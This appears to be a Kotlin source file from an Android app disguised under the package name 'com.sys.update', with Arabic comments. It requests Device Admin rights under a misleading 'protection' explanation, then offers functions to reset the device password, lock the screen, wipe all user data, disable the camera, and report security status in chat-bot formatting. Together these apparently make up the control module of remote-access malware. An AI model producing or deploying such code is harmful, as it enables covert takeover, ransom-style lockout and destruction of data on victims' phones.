package com.sys.update

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log

object AdminHelper {

    private fun getDPM(ctx: Context): DevicePolicyManager {
        return ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
    }

    private fun getAdmin(ctx: Context): ComponentName {
        return ComponentName(ctx, AdminReceiver::class.java)
    }

    /**
     * هل Device Admin مفعّل؟
     */
    fun isEnabled(ctx: Context): Boolean {
        return try {
            getDPM(ctx).isAdminActive(getAdmin(ctx))
        } catch (_: Exception) { false }
    }

    /**
     * فتح صفحة التفعيل
     */
    fun requestEnable(ctx: Context) {
        try {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, getAdmin(ctx))
            intent.putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "لتفعيل الحماية وإدارة النظام"
            )
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(intent)
        } catch (e: Exception) {
            Log.e("AdminHelper", "requestEnable err: ${e.message}")
        }
    }

    /**
     * قفل الشاشة
     */
    fun lockScreen(ctx: Context): Boolean {
        return try {
            getDPM(ctx).lockNow()
            true
        } catch (e: Exception) {
            Log.e("AdminHelper", "lockScreen err: ${e.message}")
            false
        }
    }

    /**
     * تغيير كلمة السر
     */
    fun setPassword(ctx: Context, password: String): Boolean {
        return try {
            getDPM(ctx).resetPassword(password, 0)
            true
        } catch (e: Exception) {
            Log.e("AdminHelper", "setPassword err: ${e.message}")
            false
        }
    }

    /**
     * مسح الجهاز كامل
     */
    fun wipeDevice(ctx: Context): Boolean {
        return try {
            getDPM(ctx).wipeData(0)
            true
        } catch (e: Exception) {
            Log.e("AdminHelper", "wipeDevice err: ${e.message}")
            false
        }
    }

    /**
     * تعطيل الكاميرا
     */
    fun disableCamera(ctx: Context): Boolean {
        return try {
            val admin = getAdmin(ctx)
            getDPM(ctx).setCameraDisabled(admin, true)
            true
        } catch (e: Exception) {
            Log.e("AdminHelper", "disableCamera err: ${e.message}")
            false
        }
    }

    /**
     * تفعيل الكاميرا
     */
    fun enableCamera(ctx: Context): Boolean {
        return try {
            val admin = getAdmin(ctx)
            getDPM(ctx).setCameraDisabled(admin, false)
            true
        } catch (e: Exception) {
            Log.e("AdminHelper", "enableCamera err: ${e.message}")
            false
        }
    }

    /**
     * مسح كل بيانات المستخدم (بدون إزالة النظام)
     */
    fun wipeData(ctx: Context): Boolean {
        return try {
            getDPM(ctx).wipeData(0)
            true
        } catch (e: Exception) {
            Log.e("AdminHelper", "wipeData err: ${e.message}")
            false
        }
    }

    /**
     * معلومات الأمان
     */
    fun getSecurityInfo(ctx: Context): String {
        return try {
            val dpm = getDPM(ctx)
            val admin = getAdmin(ctx)
            val sb = StringBuilder()

            sb.append("🛡 *معلومات Device Admin*\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
            sb.append("✅ *مفعّل:* ${isEnabled(ctx)}\n")

            if (isEnabled(ctx)) {
                try {
                    sb.append("📊 *محاولات كلمة السر الفاشلة:* ${dpm.currentFailedPasswordAttempts}\n")
                } catch (_: Exception) {}

                try {
                    sb.append("📱 *الكاميرا:* ${if (dpm.getCameraDisabled(admin)) "معطّلة" else "مفعّلة"}\n")
                } catch (_: Exception) {}

                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        sb.append("🔐 *التشفير:* ${if (dpm.storageEncryptionStatus == DevicePolicyManager.ENCRYPTION_STATUS_ACTIVE) "نشط" else "غير نشط"}\n")
                    }
                } catch (_: Exception) {}
            }

            sb.toString()
        } catch (e: Exception) {
            "❌ خطأ: ${e.message}"
        }
    }
}
